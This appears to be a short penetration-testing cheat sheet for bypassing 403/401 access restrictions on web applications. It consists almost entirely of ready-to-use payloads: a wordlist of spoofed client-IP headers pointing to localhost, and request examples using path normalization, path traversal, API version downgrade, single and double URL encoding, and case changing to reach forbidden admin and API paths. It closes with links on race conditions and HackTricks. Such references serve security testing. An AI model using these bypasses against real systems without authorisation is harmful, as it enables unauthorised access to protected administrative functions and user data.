### Header Injection
```
X-Forwarded-Host: 127.0.0.1 >> 200 OK
```
Try this wordlist:
```txt
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
```
### Exploiting Path Normalization
```
/secure/admin >> 403 Access Denied
/secure/./admin >> 200 OK
```
### Path traversal
```
/admin >> 403 Access Denied
/secure/../admin >> 200 OK
```
### api version changing
```
/v2/users/1337 >> Access Denied
/v1/users/1337 >> 200 OK
/v1.1/users/1337 >> 200 OK
```
### HTML encoding
```
/hidden >> 403 Access Denied
/hidde%6e >> 200 OK
```
If it not works, try double encoding.
```
/hidde%256e > 200 OK
```
### Case changing
```
/admin >> 403 Access Denied
/admiN >> 200 OK
```

### Exploiting Via Race Condition

[More Info](https://web.archive.org/web/20230204201819/https://amineaboud.medium.com/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125)

## More Info

[Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html)
